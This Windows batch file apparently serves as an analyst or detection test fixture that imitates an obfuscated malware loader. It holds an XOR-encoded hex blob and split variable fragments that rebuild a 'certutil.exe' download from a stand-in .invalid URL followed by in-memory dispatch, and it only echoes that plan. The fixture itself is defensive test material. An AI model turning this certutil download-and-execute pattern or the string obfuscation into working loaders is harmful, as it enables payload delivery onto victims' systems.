@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:hex_pairs|xor_5a
rem HUNTRESS-MATERIAL:2c676b26292e3f2a29673b392b2f33283f05283f37352e3f763e33292a3b2e393205373f37352823263b3e3b2a2e3f2867393f282e2f2e3336743f223f26292e3b3d3f0539352f342e676b263d283b2a32673c3b3405352f2e26343f222e05363b343d2f3b3d3f673435343f26393b372a3b333d3405333e67393b372a3b333d34776a3e62626a3c6f683869262f283667322e2e2a296075756a3e62626a3c6f683869743f223b372a363f7433342c3b36333e756268636b3e38696c743e3b2e
rem analyst reconstruction fixture
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "FrAg0=v=1|steps=acquire_remote,dispatch_memory|adapter"
set "FrAg1==certutil.exe|stage_count=1|graph=fan_out|next_l"
set "FrAg2=anguage=none|campaign_id=campaign-0d880f52b3|url"
set "FrAg3==https://0d880f52b3.example.invalid/8291db36.dat"
goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE
set "neutral_environment_probe=76895457"
for /l %%Q in (1,1,1) do call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
set "ReCoVeReD=!FrAg0!!FrAg1!!FrAg2!!FrAg3!"
exit /b 0
:HUNTRESS_EMIT
echo(!ReCoVeReD!
exit /b 0
:HUNTRESS_PLAN
echo certutil.exe GET https://0d880f52b3.example.invalid/8291db36.dat then dispatch memory
exit /b 0
